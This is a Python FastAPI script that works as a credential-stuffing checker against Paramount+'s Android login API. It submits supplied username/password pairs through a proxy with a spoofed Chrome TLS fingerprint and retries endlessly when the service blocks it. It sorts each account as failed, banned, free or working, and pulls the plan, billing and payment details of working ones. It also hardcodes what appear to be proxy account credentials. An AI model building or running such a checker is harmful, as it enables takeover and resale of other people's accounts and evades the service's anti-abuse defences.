import re
import secrets
import random
import urllib.parse
from typing import Optional

# Switch to the integrated library that doesn't need an external .exe daemon
import tls_client 
from fastapi import FastAPI, HTTPException
from pydantic import BaseModel

app = FastAPI()

# ---------- Country Map Translation ----------
COUNTRY_MAP = {
    "AF": "Afganistan 🇦🇫", "AX": "Åland Islands 🇫🇮", "AL": "Albania 🇦🇱", "DZ": "Algeria 🇩🇿", 
    "AS": "American Samoa 🇦🇸", "AD": "Andorra 🇦🇩", "AO": "Angola 🇦🇴", "AI": "Anguilla 🇦🇮", 
    "AQ": "Antartica 🇦🇶", "AG": "Antigua and Barbuda 🇦🇬", "AR": "Argentina 🇦🇷", "AM": "Armenia 🇦🇲", 
    "AW": "Aruba 🇦🇼", "AU": "Australia 🇦🇺", "AT": "Austria 🇦🇹", "AZ": "Azerbaijan 🇦🇿", 
    "BS": "Bahamas 🇧🇸", "BH": "Bahrain 🇧🇭", "BD": "Bangladesh 🇧🇩", "BB": "Barbados 🇧🇧", 
    "BY": "Belarus 🇧🇾", "BE": "Belgium 🇧🇪", "BZ": "Belize 🇧🇿", "BJ": "Benin 🇧🇯", 
    "BM": "Bermuda 🇧🇲", "BT": "Bhutan 🇧🇹", "BO": "Bolivia 🇧🇴", "BQ": "Bonaire", 
    "BA": "Bosnia and Herzegovina 🇧🇦", "BW": "Botswana 🇧🇼", "BR": "Brazil 🇧🇷", 
    "IO": "British Indian Ocean Territory 🇮🇴", "VG": "British Virgin Islands 🇻🇬", 
    "BN": "Brunei 🇧🇳", "BG": "Bulgaria 🇧🇬", "BF": "Burkina Faso 🇧🇫", "BI": "Burundi 🇧🇮", 
    "KH": "Cambodia 🇰🇭", "CM": "Cameroon 🇨🇲", "CA": "Canada 🇨🇦", "IC": "Canary Islands 🇮🇨", 
    "CV": "Cape Verde 🇨🇻", "KY": "Cayman Islands 🇰🇾", "CF": "Central African Republic 🇨🇫", 
    "TD": "Chad 🇹🇩", "CL": "Chile 🇨🇱 ", "CN": "China 🇨🇳", "CX": "Christmas Island 🇨🇽", 
    "CC": "Cocos (Keeling) Islands 🇨🇨", "CO": "Colombia 🇨🇴", "KM": "Comoros 🇰🇲", 
    "CG": "Republic Congo 🇨🇬", "CD": "Democratic Congo 🇨🇩", "CK": "Cook Islands 🇨🇰", 
    "CR": "Costa Rica 🇨🇷", "CI": "Côte d'Ivoire 🇨🇮", "HR": "Croatia 🇭🇷", "CU": "Cuba 🇨🇺", 
    "CW": "Curaçao 🇨🇼", "CY": "Cyprus 🇨🇾", "CZ": "Czech Republic 🇨🇿", "DK": "Denmark 🇩🇰", 
    "DJ": "Djibouti 🇩🇯", "DM": "Dominica 🇩🇲", "DO": "Dominican Republic 🇩🇴", "EC": "Ecuador 🇪🇨", 
    "EG": "Egypt 🇪🇬", "SV": "El Salvador 🇸🇻", "GQ": "Equatorial Guinea 🇬🇶", "ER": "Eritrea 🇪🇷", 
    "EE": "Estonia 🇪🇪", "ET": "Eswatini 🇸🇿", "FK": "Falkland Islands 🇫🇰", "FO": "Faroe Islands 🇫🇴", 
    "FJ": "Fiji 🇫🇯", "FI": "Finland 🇫🇮", "FR": "France 🇫🇷", "GF": "French Guiana 🇬🇫", 
    "PF": "French Polynesia 🇵🇫", "TF": "French Southern Territories 🇹🇫", "GA": "Gabon 🇬🇦", 
    "GM": "Gambia 🇬🇲", "GE": "Georgia 🇬🇪", "DE": "Germany 🇩🇪", "GH": "Ghana 🇬🇭", 
    "GI": "Gibraltar 🇬🇮", "GR": "Greece 🇬🇷", "GL": "Greenland 🇬🇱", "GD": "Grenada 🇬🇩", 
    "GP": "Guadeloupe 🇬🇵", "GU": "Guam 🇬🇺", "GT": "Guatemala 🇬🇹", "GG": "Guernsey 🇬🇬", 
    "GN": "Guinea 🇬🇳", "GW": "Guinea-Bissau 🇬🇼", "GY": "Guyana 🇬🇾", "HT": "Haiti 🇭🇹", 
    "HN": "Honduras 🇭🇳", "HK": "Hong Kong 🇭🇰", "HU": "Hungary 🇭🇺", "IS": "Iceland 🇮🇸", 
    "IN": "India 🇮🇳", "ID": "Indonesia 🇮🇩", "IR": "Iran 🇮🇷", "IQ": "Iraq 🇮🇶", 
    "IE": "Ireland 🇮🇪", "IM": "Isle of Man 🇮🇲", "IL": "Israel 🇮🇱", "IT": "Italy 🇮🇹", 
    "JM": "Jamaica 🇯🇲", "JP": "Japan 🇯🇵", "JE": "Jersey 🇯🇪", "JO": "Jordan 🇯🇴", 
    "KZ": "Kazakhstan 🇰🇿", "KE": "Kenya 🇰🇪", "KI": "Kiribati 🇰🇮", "XK": "Kosovo 🇽🇰", 
    "KW": "Kuwait 🇰🇼", "KG": "Kyrgyzstan 🇰🇬", "LA": "Laos 🇱🇦", "LV": "Latvia 🇱🇻", 
    "LB": "Lebanon 🇱🇧", "LS": "Lesotho 🇱🇸", "LR": "Liberia 🇱🇷", "LY": "Libya 🇱🇾", 
    "LI": "Liechtenstein 🇱🇮", "LT": "Lithuania 🇱🇹", "LU": "Luxembourg 🇱🇺", "MO": "Macau 🇲🇴", 
    "MG": "Madagascar 🇲🇬", "MW": "Malawi 🇲🇼", "MY": "Malaysia 🇲🇾", "MV": "Maldives 🇲🇻", 
    "ML": "Mali 🇲🇱", "MT": "Malta 🇲🇹", "MH": "Marshall Islands 🇲🇭", "MQ": "Martinique 🇲🇶", 
    "MR": "Mauritania 🇲🇷", "MU": "Mauritius 🇲🇺", "YT": "Mayotte 🇾🇹", "MX": "Mexico 🇲🇽", 
    "FM": "Micronesia 🇫🇲", "MD": "Moldova 🇲🇩", "MC": "Monaco 🇲🇨", "MN": "Mongolia 🇲🇳", 
    "ME": "Montenegro 🇲🇪", "MS": "Montserrat 🇲🇸", "MA": "Morocco 🇲🇦", "MZ": "Mozambique 🇲🇿", 
    "MM": "Myanmar 🇲🇲", "NA": "Namibia 🇳🇦", "NR": "Nauru 🇳🇷", "NP": "Nepal 🇳🇵", 
    "NL": "Netherlands 🇳🇱", "NC": "New Caledonia 🇳🇨", "NZ": "New Zealand 🇳🇿", "NI": "Nicaragua 🇳🇮", 
    "NE": "Niger 🇳🇪", "NG": "Nigeria 🇳🇬", "NU": "Niue 🇳🇺", "NF": "Norfolk Island 🇳🇫", 
    "KP": "North Korea 🇰🇵", "MK": "North Macedonia 🇲🇰", "MP": "Northern Mariana Islands 🇲🇵", 
    "NO": "Norway 🇳🇴", "OM": "Oman 🇴🇲", "PK": "Pakistan 🇵🇰", "PW": "Palau 🇵🇼", 
    "PS": "Palestine 🇵🇸", "PA": "Panama 🇵🇦", "PG": "Papua New Guinea 🇵🇬", "PY": "Paraguay 🇵🇾", 
    "PE": "Peru 🇵🇪", "PH": "Philippines 🇵🇭", "PN": "Pitcairn 🇵🇳", "PL": "Poland 🇵🇱", 
    "PT": "Portugal 🇵🇹", "PR": "Puerto Rico 🇵🇷", "QA": "Qatar 🇶🇦", "RE": "Réunion 🇷🇪", 
    "RO": "Romania 🇷🇴", "RU": "Russia 🇷🇺", "RW": "Rwanda 🇷🇼", "WS": "Samoa 🇼🇸", 
    "SM": "San Marino 🇸🇲", "ST": "Sao Tome and Principe 🇸🇹", "SA": "Saudi Arabia 🇸🇦", 
    "SN": "Senegal 🇸🇳", "RS": "Serbia 🇷🇸", "SC": "Seychelles 🇸🇨", "SL": "Sierra Leone 🇸🇱", 
    "SG": "Singapore 🇸🇬", "SX": "Sint Maarten 🇸🇽", "SK": "Slovakia 🇸🇰", "SI": "Slovenia 🇸🇮", 
    "GS": "South Georgia 🇬🇸", "SB": "Solomon Islands 🇸🇧", "SO": "Somalia 🇸🇴", 
    "ZA": "South Africa 🇿🇦", "KR": "South Korea 🇰🇷", "SS": "South Sudan 🇸🇸", 
    "ES": "Spain 🇪🇸", "LK": "Sri Lanka 🇱🇰", "BL": "St. Barthélemy 🇧🇱", "SH": "Saint Helena 🇸🇭", 
    "KN": "Saint Kitts and Nevis 🇰🇳", "LC": "St. Lucia 🇱🇨", "PM": "Saint Pierre 🇵🇲", 
    "VC": "Saint Vincent 🇻🇨", "SD": "Sudan 🇸🇩", "SR": "Suriname 🇸🇷", "SZ": "Swaziland 🇸🇿", 
    "SE": "Sweden 🇸🇪", "CH": "Switzerland 🇨🇭", "SY": "Syrian Arab Republic 🇸🇾", 
    "TW": "Taiwan 🇹🇼", "TJ": "Tajikistan 🇹🇯", "TZ": "Tanzania 🇹🇿", "TH": "Thailand 🇹🇭", 
    "TL": "Timor-Leste 🇹🇱", "TG": "Togo 🇹🇬", "TK": "Tokelau 🇹🇰", "TO": "Tonga 🇹🇴", 
    "TT": "Trinidad and Tobago 🇹🇹", "TN": "Tunisia 🇹🇳", "TR": "Turkey 🇹🇷", 
    "TM": "Turkmenistan 🇹🇲", "TC": "Turks and Caicos 🇹🇨", "TV": "Tuvalu 🇹🇻", 
    "UG": "Uganda 🇺🇬", "UA": "Ukraine 🇺🇦", "AE": "UAE 🇦🇪", "GB": "United Kingdom 🇬🇧", 
    "US": "United States 🇺🇸", "UY": "Uruguay 🇺🇾", "UZ": "Uzbekistan 🇺🇿", "VI": "Virgin Islands 🇻🇮", 
    "VU": "Vanuatu 🇻🇺", "VA": "Vatican 🇻🇦", "VE": "Venezuela 🇻🇪", "VN": "Vietnam 🇻🇳", 
    "WF": "Wallis and Futuna 🇼🇫", "EH": "Western Sahara 🇪🇭", "YE": "Yemen 🇾🇪", 
    "ZM": "Zambia 🇿🇲", "ZW": "Zimbabwe 🇿🇼"
}

class CheckInput(BaseModel):
    username: str
    password: str
    proxy: Optional[str] = "core.eclipseproxy.com:3030:eclipse_Acho1234:3b8fe71d-eb2a-40b6-9cad-bbb1927b0e25"
    use_proxy: bool = True

def parse_lr(source: str, left: str, right: str) -> str:
    try:
        start = source.index(left) + len(left)
        end = source.index(right, start)
        return source[start:end]
    except ValueError:
        return ""

def format_proxy(raw_proxy: str) -> str:
    if not raw_proxy:
        return ""
    try:
        userpass_match = re.search(r"^[^:]+:[^:]+:([^:]+:[^_]+(?:_.+)?)$", raw_proxy)
        ipport_match = re.search(r"^([^:]+:[^:]+)", raw_proxy)
        if userpass_match and ipport_match:
            return f"http://{userpass_match.group(1)}@{ipport_match.group(1)}"
    except Exception:
        pass
    return ""

@app.post("/check")
def run_check(payload: CheckInput):
    device_id = secrets.token_hex(8).lower()
    
    proxy_url = ""
    if payload.use_proxy and payload.proxy:
        proxy_url = format_proxy(payload.proxy)

    user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

    # Base native headers directly targeting the api endpoints
    headers = {
        "Host": "www.intl.paramountplus.com",
        "Cookie": "CBS_DEVICEID=",
        "Cache-Control": "max-age=0",
        "Traceparent": "00-c206720e0f5a4e1387706d69d577877c-10cc66f212114532-01",
        "Tracestate": "2321606@nr=0-2-2936348-766585785-10cc66f212114532----1763113514852",
        "Newrelic": "eyJ2IjpbMCwyXSwiZCI6eyJ0eSI6Ik1vYmlsZSIsImFjIjoiMjkzNjM0OCIsImFwIjoiNzY2NTg1Nzg1IiwidHIiOiJjMjA2NzIwZTBmNWE0ZTEzODc3ODc3YyIsImlkIjoiMTBjYzY2ZjIxMjExNDUzMiIsInRpIjoxNzYzMTEzNTE0ODUyLCJ0ayI6IjIzMjE2MDYifX0=",
        "User-Agent": user_agent,
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type": "application/x-www-form-urlencoded"
    }

    # Initialize embedded native engine (Mirrors Chrome 120 JA3 fingerprint directly inside Vercel)
    session = tls_client.Session(client_identifier="chrome_120", random_tls_extension_order=True)
    session.http2 = True

    # ------------------ #get Block ------------------
    while True:
        try:
            url = "https://www.intl.paramountplus.com/apps-api/v2.1/androidphone/auth/login.json?locale=en-us&at=ABC74o%2B31mI%2F%2FzQ3GstOJMJJ%2FgdJGAU5PCKXsJ%2B%2BroG%2FyHi2O754P8Ojsak4Ev7LXck%3D"
            
            login_body = {
                "j_username": payload.username,
                "j_password": payload.password,
                "deviceId": device_id
            }
            login_body_encoded = urllib.parse.urlencode(login_body)
            
            response = session.post(
                url,
                headers=headers,
                data=login_body_encoded,
                proxy=proxy_url if proxy_url else None,
                timeout_seconds=15 # Max timeout on Vercel is 15-64s depending on plan tier
            )
            
            if response.status_code in (500, 403, 406):
                continue
                
            body = response.text
            break
        except Exception:
            continue

    if "Invalid username/password pair" in body or '"status":400,"error":"Bad Request",' in body:
        return {"status": "FAIL"}
        
    if "userId" not in body:
        return {"status": "BAN/UNKNOWN"}

    # ------------------ #get2 Block ------------------
    while True:
        try:
            status_url = "https://www.intl.paramountplus.com/apps-api/v3.0/androidphone/login/status.json?locale=en-us&at=ABAe6KaaPmQXoXXr2FS9yDys4wXLwooaEREtz0c6agC7vrQhjTY%2FYfp1dfSDtu9EbB0%3D"
            
            response2 = session.get(
                status_url,
                headers=headers,
                proxy=proxy_url if proxy_url else None,
                timeout_seconds=15
            )
            
            if response2.status_code in (500, 403, 406):
                continue
                
            body2 = response2.text
            break
        except Exception:
            continue

    if "NEW_FREE_PACKAGE" in body2 or '"planType":null,' in body2:
        return {"status": "FREE/CUSTOM"}

    country_code = parse_lr(body2, '"subscriptionCountry":"', '"')
    
    return {
        "status": "SUCCESS",
        "data": {
            "Country": COUNTRY_MAP.get(country_code, f"Unknown ({country_code})"),
            "Plan": parse_lr(body2, '"productName":"', '"'),
            "PlanType": parse_lr(body2, '"planType":"', '"'),
            "BillingPeriod": parse_lr(body2, '"billingCadence":"', '"'),
            "Package": parse_lr(body2, '"packageCode":"', '"'),
            "PaymentMethod": parse_lr(body2, '"packageSource":"', '"')
        }
    }
